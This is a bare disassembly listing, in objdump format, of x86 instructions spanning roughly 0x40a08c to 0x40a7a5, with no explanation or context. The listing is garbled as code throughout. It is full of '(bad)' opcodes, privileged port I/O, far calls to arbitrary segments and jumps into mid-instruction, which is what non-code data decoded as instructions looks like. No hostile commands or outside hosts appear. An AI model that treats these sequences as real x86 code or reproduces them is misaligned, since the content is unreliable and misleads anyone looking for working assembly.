  40a08c:	mov    ds,ebp
  40a08e:	es out dx,al
  40a090:	xchg   ebx,eax
  40a091:	cwde   
  40a092:	jg     0x40a0df
  40a094:	inc    ecx
  40a095:	sub    ecx,DWORD PTR [ecx-0x63]
  40a098:	mov    eax,ds:0x16bcd672
  40a09d:	outs   dx,BYTE PTR ds:[esi]
  40a09e:	or     eax,0xd529e671
  40a0a3:	inc    ebx
  40a0a4:	xor    eax,0x1396cfbd
  40a0a9:	jl     0x40a128
  40a0ab:	mov    DWORD PTR [ecx-0x75],ebp
  40a0ae:	nop
  40a0af:	cmp    DWORD PTR ds:0xcfb1d30e,0x7136420a
  40a0b9:	jno    0x40a07c
  40a0bb:	mov    ch,0xbc
  40a0bd:	adc    eax,edx
  40a0bf:	jmp    0x40a105
  40a0c1:	ja     0x40a089
  40a0c3:	fwait
  40a0c4:	and    DWORD PTR [ebx],esi
  40a0c6:	mov    bh,BYTE PTR [edi]
  40a0c8:	fcom   DWORD PTR [esi]
  40a0ca:	push   0xffffff94
  40a0cc:	punpckldq mm5,DWORD PTR [eax]
  40a0cf:	stos   DWORD PTR es:[edi],eax
  40a0d0:	call   0x4ca5:0xedb4b913
  40a0d7:	fxch   st(1)
  40a0d9:	stos   BYTE PTR es:[edi],al
  40a0da:	(bad)  
  40a0db:	pop    edi
  40a0dc:	mov    dl,0x4c
  40a0de:	lock bound eax,QWORD PTR [ecx*8-0x57fe987a]
  40a0e6:	clc    
  40a0e7:	pop    ss
  40a0e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0ea:	xor    cl,BYTE PTR [edx]
  40a0ec:	lods   al,BYTE PTR ds:[esi]
  40a0ed:	daa    
  40a0ee:	jnp    0x40a134
  40a0f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0f1:	retf   0x4533
  40a0f4:	mov    ecx,0x52d1aa6c
  40a0f9:	retf   
  40a0fa:	xor    al,0x15
  40a0fc:	call   0xf478:0x72b95bf5
  40a103:	retf   
  40a104:	ds aad 0xda
  40a107:	xor    esi,DWORD PTR [ecx-0x1d294727]
  40a10d:	mov    cl,0x2f
  40a10f:	cmc    
  40a110:	jae    0x40a108
  40a112:	mov    ecx,ecx
  40a114:	push   ds
  40a115:	mov    edi,ecx
  40a117:	lock inc esi
  40a119:	enter  0x1e24,0x7e
  40a11d:	mov    eax,0x14557c49
  40a122:	pop    edi
  40a123:	retfw  0xfb52
  40a127:	jle    0x40a0fa
  40a129:	dec    esp
  40a12a:	xor    dh,al
  40a12c:	or     eax,0xf625da2f
  40a131:	in     al,dx
  40a132:	ds mov edi,0x40b8b99
  40a138:	mov    esi,0xbb26c123
  40a13d:	ficom  WORD PTR [ebp+0x1c2b7582]
  40a143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a144:	mov    esp,0xf09adaef
  40a149:	mov    edx,0x24cdd64a
  40a14e:	dec    esi
  40a14f:	xchg   ecx,eax
  40a150:	shl    BYTE PTR [ebx],0xb6
  40a153:	inc    edi
  40a154:	xor    al,0x46
  40a156:	out    0x11,eax
  40a158:	inc    esi
  40a159:	mov    bl,0x67
  40a15b:	mov    ah,0xa6
  40a15d:	xlat   BYTE PTR ds:[ebx]
  40a15e:	clc    
  40a15f:	inc    ebx
  40a160:	outs   dx,BYTE PTR ds:[esi]
  40a161:	jae    0x40a14c
  40a163:	push   ds
  40a164:	shl    DWORD PTR [ecx+0x750c546e],0x38
  40a16b:	add    esp,DWORD PTR [eax-0x77]
  40a16e:	sub    al,0xc4
  40a170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a171:	sub    bl,0xc2
  40a174:	inc    edi
  40a175:	xor    edi,DWORD PTR [ebx-0x18]
  40a178:	das    
  40a179:	mov    edx,0x25f66c8
  40a17e:	sbb    eax,0x5d62f253
  40a183:	adc    DWORD PTR [ecx],edi
  40a185:	xchg   ebx,eax
  40a186:	and    edx,DWORD PTR [ebp+edx*1+0x76]
  40a18a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a18b:	imul   edi,edx,0xee7d12f7
  40a191:	jbe    0x40a132
  40a193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a194:	xchg   ebp,eax
  40a195:	inc    eax
  40a196:	lods   eax,DWORD PTR ds:[esi]
  40a197:	mov    bh,0xc5
  40a199:	adc    ebp,DWORD PTR [edx+0x37]
  40a19c:	pushf  
  40a19d:	xor    BYTE PTR [edx],al
  40a19f:	sahf   
  40a1a0:	add    al,0x34
  40a1a2:	mov    ah,0x34
  40a1a4:	rcl    DWORD PTR [esi-0x4aeb13d8],0x44
  40a1ab:	aad    0xa4
  40a1ad:	dec    ebx
  40a1ae:	mov    ebp,0xd4c1dbb0
  40a1b3:	in     eax,dx
  40a1b4:	popa   
  40a1b5:	jecxz  0x40a215
  40a1b7:	jp     0x40a1a9
  40a1b9:	sbb    eax,0x1eb9d5a8
  40a1be:	sbb    bl,bh
  40a1c0:	adc    ah,BYTE PTR ds:0x88d2501a
  40a1c6:	mov    eax,0xe96027fd
  40a1cb:	(bad)  
  40a1cc:	fcmovnb st,st(1)
  40a1ce:	inc    esp
  40a1cf:	adc    al,0xd5
  40a1d1:	dec    esi
  40a1d2:	dec    edx
  40a1d3:	icebp  
  40a1d4:	fcomp  DWORD PTR [ecx+0x17bef9eb]
  40a1da:	cmp    esp,DWORD PTR [eax+0x6df77a00]
  40a1e0:	outs   dx,BYTE PTR ds:[esi]
  40a1e1:	fadd   st,st(0)
  40a1e3:	adc    BYTE PTR [ebp+0x6df3ee5a],0x51
  40a1ea:	shl    DWORD PTR [ebp+0x72f72c3a],0xb3
  40a1f1:	in     eax,dx
  40a1f2:	inc    edi
  40a1f3:	out    dx,eax
  40a1f4:	mov    ds:0x6f9d70a0,al
  40a1f9:	icebp  
  40a1fa:	pop    ds
  40a1fb:	push   0xffffff97
  40a1fd:	shr    bh,0xba
  40a200:	retf   0xad34
  40a203:	add    al,0x29
  40a205:	mov    ecx,DWORD PTR [edx+edx*8+0x1c31a610]
  40a20c:	and    edi,edi
  40a20e:	sub    BYTE PTR [edi],cl
  40a210:	xchg   edi,eax
  40a211:	jne    0x40a1da
  40a213:	xor    bh,BYTE PTR [edx+edx*8-0x10fb95bf]
  40a21a:	test   BYTE PTR [esi],bl
  40a21c:	jecxz  0x40a297
  40a21e:	and    bl,cl
  40a220:	out    0x6,eax
  40a222:	jp     0x40a1c2
  40a224:	mov    cl,0x37
  40a226:	ds sbb al,0x23
  40a229:	mov    ecx,0x8dffa8c9
  40a22e:	cmp    BYTE PTR [edx],ch
  40a230:	jae    0x40a1d1
  40a232:	into   
  40a233:	mov    ah,0xd0
  40a235:	into   
  40a236:	popf   
  40a237:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a238:	mov    gs,esi
  40a23a:	test   eax,0x1ff89d24
  40a23f:	lds    esp,FWORD PTR [esp+edx*1+0x5c]
  40a243:	dec    esp
  40a244:	or     al,ah
  40a246:	rcl    bl,0x5a
  40a249:	daa    
  40a24a:	mov    ecx,DWORD PTR [ecx]
  40a24c:	xor    DWORD PTR [edi+ebp*8],0xcd836d0f
  40a253:	mov    dh,0xb9
  40a255:	push   ebp
  40a256:	sub    BYTE PTR [ebx],dl
  40a258:	inc    ebp
  40a259:	(bad)  
  40a25a:	fsubr  DWORD PTR [ebx]
  40a25c:	push   ebp
  40a25d:	mov    ds,ebx
  40a25f:	jmp    0xdfff9409
  40a264:	dec    ecx
  40a265:	mov    bh,0x3e
  40a267:	add    al,0x70
  40a269:	les    ecx,FWORD PTR [eax]
  40a26b:	pop    ss
  40a26c:	xchg   edx,eax
  40a26d:	pop    ebp
  40a26e:	addr16 xchg ebx,eax
  40a270:	add    al,0x35
  40a272:	pop    es
  40a273:	data16 adc bh,ah
  40a276:	add    eax,0x1f136b88
  40a27b:	into   
  40a27c:	push   eax
  40a27d:	scas   eax,DWORD PTR es:[edi]
  40a27e:	mov    ebx,0xc7fd602a
  40a283:	sbb    bh,BYTE PTR [ebx-0x4c3d39a7]
  40a289:	pop    ebp
  40a28a:	repz not BYTE PTR [ecx-0x5a]
  40a28e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a28f:	xor    dl,BYTE PTR [edx]
  40a291:	push   esp
  40a292:	retf   
  40a293:	inc    edi
  40a294:	push   esi
  40a295:	das    
  40a296:	test   DWORD PTR [eax+esi*4],0xf057e93c
  40a29d:	loop   0x40a29c
  40a29f:	je     0x40a2e7
  40a2a1:	sub    bl,BYTE PTR [eax-0x6e]
  40a2a4:	fwait
  40a2a5:	mov    dl,0xfd
  40a2a7:	xchg   edx,eax
  40a2a8:	xchg   esi,eax
  40a2a9:	call   0xaf98c09c
  40a2ae:	pop    esp
  40a2af:	and    al,0xc1
  40a2b1:	sti    
  40a2b2:	pop    ebp
  40a2b3:	xor    eax,0xe9c6eafb
  40a2b8:	xor    al,0x4f
  40a2ba:	icebp  
  40a2bb:	or     DWORD PTR ss:[esi],ecx
  40a2be:	sbb    BYTE PTR [esi+0x4e],al
  40a2c1:	out    0x2,eax
  40a2c3:	ss int3 
  40a2c5:	lahf   
  40a2c6:	mov    ecx,0x614c56ca
  40a2cb:	adc    BYTE PTR [edx-0x4],0xca
  40a2cf:	push   ds
  40a2d0:	bound  ebx,QWORD PTR [eax+0x25]
  40a2d3:	jmp    0x40a2d2
  40a2d5:	cli    
  40a2d6:	inc    edx
  40a2d7:	ins    DWORD PTR es:[edi],dx
  40a2d8:	mov    eax,0xefd203a2
  40a2dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2de:	and    BYTE PTR [eax+0x698a35ef],bl
  40a2e4:	jmp    0x40a300
  40a2e6:	pop    edx
  40a2e7:	pop    esi
  40a2e8:	js     0x40a2ec
  40a2ea:	add    bl,0xd4
  40a2ed:	dec    ebp
  40a2ee:	mov    al,ds:0x6c9ac253
  40a2f3:	loope  0x40a293
  40a2f5:	push   ss
  40a2f6:	push   ds
  40a2f7:	add    BYTE PTR [edx-0x46],cl
  40a2fa:	jne    0x40a300
  40a2fc:	aam    0xb8
  40a2fe:	sub    al,dl
  40a300:	xchg   ebx,eax
  40a301:	cmp    BYTE PTR ds:[eax+0x0],cl
  40a305:	clc    
  40a306:	mov    BYTE PTR [edx],cl
  40a308:	inc    edi
  40a309:	ja     0x40a2dd
  40a30b:	inc    edx
  40a30c:	jmp    FWORD PTR [edx-0x5713a7cb]
  40a312:	dec    esp
  40a313:	xor    al,0x62
  40a315:	std    
  40a316:	fwait
  40a317:	jp     0x40a38d
  40a319:	mov    bh,BYTE PTR [esi]
  40a31b:	daa    
  40a31c:	mov    ch,BYTE PTR [ecx]
  40a31e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a31f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a320:	and    bl,dh
  40a322:	sbb    al,0x9a
  40a324:	sbb    BYTE PTR [esi+eiz*1],0xf2
  40a328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a329:	pop    ds
  40a32a:	adc    ecx,ecx
  40a32c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a32d:	pop    ebx
  40a32e:	pop    edx
  40a32f:	rcl    DWORD PTR [ebp-0xd],1
  40a332:	(bad)  [ebx-0x7efe1da3]
  40a338:	cmp    bh,bh
  40a33a:	fsubr  DWORD PTR [esi]
  40a33c:	loop   0x40a358
  40a33e:	retf   0x14f1
  40a341:	popa   
  40a342:	imul   esp,DWORD PTR [esi+0x6585e674],0x37
  40a349:	push   ebp
  40a34a:	inc    esp
  40a34b:	in     eax,0xd0
  40a34d:	xor    al,0x8a
  40a34f:	bound  ecx,QWORD PTR [ebx+eiz*4]
  40a352:	jno    0x40a3ce
  40a354:	fsubrp st(1),st
  40a356:	(bad)  
  40a357:	sqrtps xmm7,XMMWORD PTR [edi-0x3c]
  40a35b:	ss nop
  40a35d:	in     al,0x9e
  40a35f:	pop    ecx
  40a360:	test   DWORD PTR [ebp-0x63],ebp
  40a363:	(bad)  [eax]
  40a365:	outs   dx,DWORD PTR ds:[esi]
  40a366:	ret    
  40a367:	xchg   ebx,eax
  40a368:	test   eax,0xb4a409e5
  40a36d:	ror    BYTE PTR [eax+esi*1+0xb38d7b],0x66
  40a375:	idiv   BYTE PTR [ebp-0x4ef9033e]
  40a37b:	(bad)  
  40a37c:	std    
  40a37d:	pop    edx
  40a37e:	jg     0x40a34c
  40a380:	sbb    esp,DWORD PTR [edi-0x50821a0a]
  40a386:	mov    WORD PTR [edi],es
  40a388:	xchg   DWORD PTR [edx-0x2237c100],esp
  40a38e:	sub    al,0xc5
  40a390:	mov    BYTE PTR [ecx-0x41],dh
  40a393:	inc    esi
  40a394:	(bad)  
  40a395:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a396:	nop
  40a397:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a398:	inc    ecx
  40a399:	sub    al,0xc7
  40a39b:	pop    edx
  40a39c:	xchg   BYTE PTR [ecx-0x1c9fad23],ch
  40a3a2:	adc    esp,esi
  40a3a4:	dec    ebx
  40a3a5:	aad    0x23
  40a3a7:	ret    0x7348
  40a3aa:	mov    dl,0x5c
  40a3ac:	retf   
  40a3ad:	add    al,0x1f
  40a3af:	into   
  40a3b0:	test   DWORD PTR [eax],ebx
  40a3b2:	push   0x6d
  40a3b4:	adc    al,0xf4
  40a3b6:	mov    dl,0x6b
  40a3b8:	add    BYTE PTR [ebx+0x5620cdee],al
  40a3be:	cmp    al,0xf
  40a3c0:	(bad)  
  40a3c1:	adc    ah,BYTE PTR [ebx-0x11b75c0e]
  40a3c7:	popf   
  40a3c8:	ins    DWORD PTR es:[edi],dx
  40a3c9:	pop    esp
  40a3ca:	imul   ebx,DWORD PTR [edi],0x19
  40a3cd:	scas   eax,DWORD PTR es:[edi]
  40a3ce:	sub    BYTE PTR [ecx+edi*8+0x4f],dl
  40a3d2:	shld   edi,esi,0x4d
  40a3d6:	jae    0x40a40a
  40a3d8:	adc    dl,al
  40a3da:	xchg   edx,eax
  40a3db:	jp     0x40a403
  40a3dd:	data16 out dx,al
  40a3df:	adc    eax,0xb03140ed
  40a3e4:	sti    
  40a3e5:	lods   eax,DWORD PTR ds:[esi]
  40a3e6:	push   eax
  40a3e7:	test   al,0xc9
  40a3e9:	pop    es
  40a3ea:	fstp   TBYTE PTR [edx+ebp*1+0x60aa9064]
  40a3f1:	test   DWORD PTR [eax+ebx*2+0x3ce7b8a5],esp
  40a3f8:	pop    edi
  40a3f9:	inc    edx
  40a3fa:	lds    ebp,FWORD PTR [esp+edi*8+0x3f124ce7]
  40a401:	push   edx
  40a402:	cmp    al,0x6b
  40a404:	sub    edx,DWORD PTR es:[esi+0x69afd9ba]
  40a40b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a40c:	cs hlt 
  40a40e:	(bad)  
  40a40f:	jle    0x40a3dd
  40a411:	push   cs
  40a412:	inc    ebx
  40a413:	mov    dl,0x53
  40a415:	sbb    al,0x7c
  40a417:	pop    edi
  40a418:	mov    bh,0x9e
  40a41a:	leave  
  40a41b:	les    edi,FWORD PTR [ecx]
  40a41d:	xor    esp,DWORD PTR [eax-0x68]
  40a420:	pop    ebx
  40a421:	jmp    0x40a45c
  40a423:	inc    ebp
  40a424:	data16 adc dh,BYTE PTR [ebx+0xabf7806]
  40a42b:	dec    esp
  40a42c:	lahf   
  40a42d:	mov    al,ds:0x673295cb
  40a432:	ret    0xf7ab
  40a435:	je     0x40a3e6
  40a437:	pusha  
  40a438:	xchg   BYTE PTR [edi],bh
  40a43a:	into   
  40a43b:	bnd jbe 0x40a41c
  40a43e:	xor    ebp,0x62
  40a441:	pop    esi
  40a442:	and    BYTE PTR [ebx],dl
  40a444:	cmp    ch,al
  40a446:	xor    dh,BYTE PTR [esi+0x74]
  40a449:	cs shl ebp,1
  40a44c:	mov    edi,0x5fb5ca3
  40a451:	add    eax,0xe94963c7
  40a456:	inc    edi
  40a457:	mov    ebp,0x3f8224ab
  40a45c:	push   ss
  40a45d:	in     al,0x46
  40a45f:	rcr    DWORD PTR [ebx-0x4d],0x72
  40a463:	out    0x23,al
  40a465:	out    dx,al
  40a466:	(bad)  
  40a467:	imul   ecx,DWORD PTR [ebp+0x7f87e099],0x3b
  40a46e:	cmp    DWORD PTR [ecx],0xffffff85
  40a471:	xchg   ebx,eax
  40a472:	iret   
  40a473:	mov    esi,0x27bab2ce
  40a478:	in     eax,dx
  40a479:	imul   BYTE PTR [ebp-0x5f]
  40a47c:	add    ah,BYTE PTR [edx+esi*4+0x61]
  40a480:	xor    eax,0xf268cfb2
  40a485:	mov    ds:0xc737886f,al
  40a48a:	sahf   
  40a48b:	and    ecx,DWORD PTR [edx+0x73]
  40a48e:	jae    0x40a4da
  40a490:	or     dl,bl
  40a492:	fwait
  40a493:	inc    edi
  40a494:	push   0x22
  40a496:	mov    BYTE PTR [esi+0x43],al
  40a499:	fisubr WORD PTR [ecx]
  40a49b:	aas    
  40a49c:	mov    al,0x2c
  40a49e:	jo     0x40a44f
  40a4a0:	in     al,dx
  40a4a1:	jmp    0x40a4da
  40a4a3:	jecxz  0x40a4e3
  40a4a5:	js     0x40a513
  40a4a7:	addr16 add al,0xdf
  40a4aa:	(bad)  
  40a4ab:	and    al,0xc1
  40a4ad:	xor    dh,BYTE PTR ds:0x1fa02781
  40a4b3:	dec    esp
  40a4b4:	inc    esi
  40a4b5:	dec    ebx
  40a4b6:	sub    edx,DWORD PTR [edx+ecx*4-0x6fb32db8]
  40a4bd:	mov    ch,0x3a
  40a4bf:	jmp    0xdacc:0xdf7f2123
  40a4c6:	mov    WORD PTR [eax],?
  40a4c8:	xchg   edi,eax
  40a4c9:	jns    0x40a480
  40a4cb:	scas   al,BYTE PTR es:[edi]
  40a4cc:	and    BYTE PTR [edi+eax*8-0x61a7fdcf],dl
  40a4d3:	retf   0x38b9
  40a4d6:	pop    esi
  40a4d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4d8:	xchg   cl,bh
  40a4da:	push   ecx
  40a4db:	cdq    
  40a4dc:	pop    ss
  40a4dd:	mov    ebx,DWORD PTR [esi-0x1b]
  40a4e0:	mov    esi,0x7fc1242c
  40a4e5:	imul   BYTE PTR [ecx+0x7005822f]
  40a4eb:	ja     0x40a514
  40a4ed:	cmp    eax,0x7a52b367
  40a4f2:	jno    0x40a556
  40a4f4:	xchg   ebp,eax
  40a4f5:	(bad)
  40a4f8:	cld    
  40a4f9:	jp     0x40a499
  40a4fb:	dec    ebp
  40a4fc:	xchg   esp,eax
  40a4fd:	lods   eax,DWORD PTR ds:[esi]
  40a4fe:	jno    0x40a4f8
  40a500:	and    eax,0xfa1f221c
  40a505:	mov    ebx,0x61743e77
  40a50a:	push   cs
  40a50b:	(bad)  
  40a50c:	data16 rol BYTE PTR [esi],0x4f
  40a510:	outs   dx,DWORD PTR ds:[esi]
  40a511:	xor    eax,esi
  40a513:	mov    edi,0xed0f8b0b
  40a518:	push   0x5c
  40a51a:	dec    esp
  40a51b:	pop    ss
  40a51c:	and    DWORD PTR [eax],0x13
  40a51f:	or     BYTE PTR [esp+ecx*4],dh
  40a522:	sbb    eax,0xff4cf8d6
  40a527:	call   0xc0703dac
  40a52c:	aaa    
  40a52d:	outs   dx,BYTE PTR ds:[esi]
  40a52e:	jecxz  0x40a575
  40a530:	(bad)  
  40a531:	jns    0x40a575
  40a533:	cmp    DWORD PTR [edx-0x2a],ebx
  40a536:	les    esp,FWORD PTR [edi]
  40a538:	mov    ebp,0x2e9adebd
  40a53d:	repz fmul DWORD PTR [ebx-0x7b]
  40a541:	shr    BYTE PTR [edi-0x60c36e08],1
  40a547:	mov    ds:0x39f84432,eax
  40a54c:	jbe    0x40a546
  40a54e:	mov    ah,0x95
  40a550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a551:	dec    esp
  40a552:	(bad)  
  40a553:	ins    DWORD PTR es:[edi],dx
  40a554:	(bad)  
  40a555:	test   eax,0x3e6c640e
  40a55a:	xor    eax,0xb5e2b1a8
  40a55f:	sub    DWORD PTR [edi],ebx
  40a561:	adc    ebx,DWORD PTR [ecx+ebp*2-0x10]
  40a565:	stc    
  40a566:	enter  0x13e5,0x82
  40a56a:	and    eax,0xaa39d770
  40a56f:	popa   
  40a570:	push   esi
  40a571:	test   DWORD PTR [ecx+eax*2-0x4c1f1d72],ebp
  40a578:	cld    
  40a579:	inc    esi
  40a57a:	pop    ebp
  40a57b:	pop    edi
  40a57c:	aaa    
  40a57d:	div    BYTE PTR [edx-0x77]
  40a580:	(bad)
  40a585:	stos   DWORD PTR es:[edi],eax
  40a586:	mov    eax,ds:0x42d118a7
  40a58b:	call   0x9cab:0x253a59b9
  40a592:	mov    bl,0x8e
  40a594:	ret    0x2160
  40a597:	out    0x36,al
  40a599:	clc    
  40a59a:	add    BYTE PTR [edx+0x116b8cc7],0x2c
  40a5a1:	div    edi
  40a5a3:	jle    0x40a58e
  40a5a5:	sar    DWORD PTR [ecx+0x1ffccd0e],0xbf
  40a5ac:	adc    al,0xe9
  40a5ae:	fdivr  DWORD PTR [edx+0x72]
  40a5b1:	inc    edx
  40a5b2:	mov    bl,0xb9
  40a5b4:	or     eax,0x8d941526
  40a5b9:	cdq    
  40a5ba:	sub    dl,BYTE PTR [ecx+0x23]
  40a5bd:	inc    ecx
  40a5be:	jmp    0x8a471642
  40a5c3:	adc    eax,DWORD PTR [eax-0x7519928e]
  40a5c9:	inc    ebx
  40a5ca:	cdq    
  40a5cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5cc:	mov    esi,0x5ba9a659
  40a5d1:	sar    DWORD PTR [ebx+0x12f95bf9],cl
  40a5d7:	outs   dx,DWORD PTR ds:[esi]
  40a5d8:	mov    ch,0xa4
  40a5da:	push   ecx
  40a5db:	(bad)  
  40a5dc:	test   al,0x4c
  40a5de:	xchg   edi,eax
  40a5df:	mov    WORD PTR [esi],?
  40a5e1:	adc    al,al
  40a5e3:	jmp    0x40a5e2
  40a5e5:	shl    DWORD PTR [ebp+0x32767522],0x7e
  40a5ec:	push   ebx
  40a5ed:	cmc    
  40a5ee:	les    esi,FWORD PTR [edx-0xa]
  40a5f1:	das    
  40a5f2:	xchg   ecx,eax
  40a5f3:	(bad)  
  40a5f4:	mov    ebp,DWORD PTR [edx+0x46]
  40a5f7:	retf   
  40a5f8:	add    DWORD PTR [ebp-0x32],ecx
  40a5fb:	sbb    esp,DWORD PTR [eax+0x3130178b]
  40a601:	pop    edi
  40a602:	mov    ecx,0x677259d5
  40a607:	iret   
  40a608:	adc    eax,edi
  40a60a:	pop    ecx
  40a60b:	xchg   esi,eax
  40a60c:	aas    
  40a60d:	call   0x2458:0xd2e35e9e
  40a614:	int    0x55
  40a616:	aam    0x86
  40a618:	jae    0x40a63a
  40a61a:	inc    esp
  40a61b:	jo     0x40a5a9
  40a61d:	xchg   esi,ecx
  40a61f:	jg     0x40a5de
  40a621:	inc    edx
  40a622:	lods   eax,DWORD PTR ds:[esi]
  40a623:	add    bh,BYTE PTR [ecx]
  40a625:	fnstenv [edx+ebx*1+0x7a]
  40a629:	clc    
  40a62a:	test   al,0xed
  40a62c:	(bad)  
  40a62d:	jmp    0xf993:0x2e1c54ad
  40a634:	fadd   DWORD PTR [edi-0x503234b0]
  40a63a:	enter  0x58e9,0x2a
  40a63e:	not    DWORD PTR [eax]
  40a640:	inc    edi
  40a641:	mov    edx,0xc01eb43c
  40a646:	sbb    dl,BYTE PTR [edx-0x5bf477fe]
  40a64c:	lea    esp,[ebx+0x464e5d43]
  40a652:	leave  
  40a653:	push   eax
  40a654:	jo     0x40a6a4
  40a656:	inc    eax
  40a657:	adc    dh,0xad
  40a65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a65b:	push   ecx
  40a65c:	test   esi,0xaf12851f
  40a662:	mov    dh,0x1e
  40a664:	xchg   edi,eax
  40a665:	dec    ebp
  40a666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a667:	lods   al,BYTE PTR ds:[esi]
  40a668:	popf   
  40a669:	dec    eax
  40a66a:	jbe    0x40a6c7
  40a66c:	hlt    
  40a66d:	loope  0x40a63b
  40a66f:	xchg   ecx,eax
  40a670:	or     eax,0x44ad5256
  40a675:	aam    0x26
  40a677:	mov    eax,ds:0x9cb4f66a
  40a67c:	icebp  
  40a67d:	pusha  
  40a67e:	jg     0x40a605
  40a680:	nop
  40a681:	inc    ebx
  40a682:	nop
  40a683:	push   edx
  40a684:	(bad)  
  40a685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a686:	pop    es
  40a687:	cli    
  40a688:	mov    cl,0xf8
  40a68a:	inc    ecx
  40a68b:	cld    
  40a68c:	and    BYTE PTR [ebx],dh
  40a68e:	inc    esi
  40a68f:	stc    
  40a690:	repnz call 0xf944:0x702c69c6
  40a698:	jl     0x40a682
  40a69a:	fcomp  DWORD PTR [edi+ebp*4]
  40a69d:	cwde   
  40a69e:	and    dh,BYTE PTR [esp+eax*4-0x80]
  40a6a2:	xor    DWORD PTR [ebx+0x10],eax
  40a6a5:	lock cld 
  40a6a7:	add    BYTE PTR [edi+esi*4+0x21c8072f],cl
  40a6ae:	fstp   QWORD PTR [ebx]
  40a6b0:	stos   DWORD PTR es:[edi],eax
  40a6b1:	mov    bh,0xc6
  40a6b3:	sar    ch,0x76
  40a6b6:	fistp  WORD PTR [eax]
  40a6b8:	ror    BYTE PTR [esi],1
  40a6ba:	bound  ecx,QWORD PTR [ebx-0x1d444578]
  40a6c0:	jo     0x40a648
  40a6c2:	(bad)  
  40a6c3:	repz or dl,dh
  40a6c6:	lods   eax,DWORD PTR ds:[esi]
  40a6c7:	dec    eax
  40a6c8:	sub    esp,DWORD PTR [edi]
  40a6ca:	in     eax,0xb9
  40a6cc:	inc    esi
  40a6cd:	dec    edx
  40a6ce:	add    eax,0x85efceb2
  40a6d3:	gs adc eax,0xe548df6
  40a6d9:	cli    
  40a6da:	xchg   BYTE PTR [ebx],bl
  40a6dc:	enter  0xb391,0x78
  40a6e0:	es int3 
  40a6e2:	fiadd  DWORD PTR [ebp+0x5c33c4c6]
  40a6e8:	outs   dx,BYTE PTR ds:[esi]
  40a6e9:	js     0x40a722
  40a6eb:	popa   
  40a6ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6ee:	pushf  
  40a6ef:	inc    DWORD PTR [esi-0x15]
  40a6f2:	pop    edi
  40a6f3:	in     eax,0xfc
  40a6f5:	loop   0x40a68d
  40a6f7:	js     0x40a6d0
  40a6f9:	sbb    eax,0x58c75476
  40a6fe:	cmp    bl,BYTE PTR [eax]
  40a700:	and    edx,eax
  40a702:	repz xor DWORD PTR [edx-0x4c],0x5fd0927e
  40a70a:	add    eax,ebx
  40a70c:	adc    BYTE PTR [edi-0x57],0x16
  40a710:	push   ss
  40a711:	icebp  
  40a712:	jne    0x40a749
  40a714:	dec    eax
  40a715:	add    DWORD PTR [esi],0x11
  40a718:	leave  
  40a719:	aad    0x90
  40a71b:	inc    ebp
  40a71c:	xchg   esi,eax
  40a71d:	fisttp DWORD PTR [edx-0x14]
  40a720:	add    ebp,DWORD PTR [ebx]
  40a722:	adc    al,0x30
  40a724:	pop    es
  40a725:	into   
  40a726:	push   esi
  40a727:	ins    BYTE PTR es:[edi],dx
  40a728:	out    dx,eax
  40a729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a72a:	add    BYTE PTR [ebx],0xc1
  40a72d:	mov    eax,0xe14f45ee
  40a732:	rol    DWORD PTR [ecx+0x30],1
  40a735:	icebp  
  40a736:	sbb    ah,BYTE PTR [eax]
  40a738:	int    0x4a
  40a73a:	add    al,0x51
  40a73c:	ds scas eax,DWORD PTR es:[edi]
  40a73e:	cs pop ss
  40a740:	add    eax,0xf551e719
  40a745:	mov    WORD PTR [esi],gs
  40a747:	int3   
  40a748:	ss stos DWORD PTR es:[edi],eax
  40a74a:	loop   0x40a72e
  40a74c:	pop    es
  40a74d:	in     al,0xd3
  40a74f:	xchg   ecx,eax
  40a750:	mov    ds:0x98e44e9e,al
  40a755:	stos   BYTE PTR es:[edi],al
  40a756:	inc    ebp
  40a757:	cmp    eax,0x6f023550
  40a75c:	sar    DWORD PTR ds:0x7a24cd09,1
  40a762:	ins    BYTE PTR es:[edi],dx
  40a763:	pop    esi
  40a764:	les    edi,FWORD PTR [esi]
  40a766:	jmp    FWORD PTR [eax-0x3bd3fdd9]
  40a76c:	in     al,dx
  40a76d:	(bad)  
  40a76e:	in     al,dx
  40a76f:	xchg   BYTE PTR [ebx],bh
  40a771:	cmp    al,bh
  40a773:	ins    BYTE PTR es:[edi],dx
  40a774:	pop    esp
  40a775:	mov    bl,0x1e
  40a777:	mov    ch,0xd5
  40a779:	mov    WORD PTR ds:0xf4a5a72b,fs
  40a77f:	push   esi
  40a780:	add    esi,eax
  40a782:	mov    edi,0x64ce74fc
  40a787:	call   0xb7d12e15
  40a78c:	cli    
  40a78d:	xchg   edx,eax
  40a78e:	lahf   
  40a78f:	xor    ch,BYTE PTR [ebx-0x25958667]
  40a795:	mov    edi,0x1e465284
  40a79a:	mov    ch,0x93
  40a79c:	sub    BYTE PTR [ebx+0x40],ah
  40a79f:	retf   0xe6a6
  40a7a2:	sbb    BYTE PTR [edi+0xe],ch
  40a7a5:	adc    esi,DWORD PTR [esp+esi*1+0x503d2053]
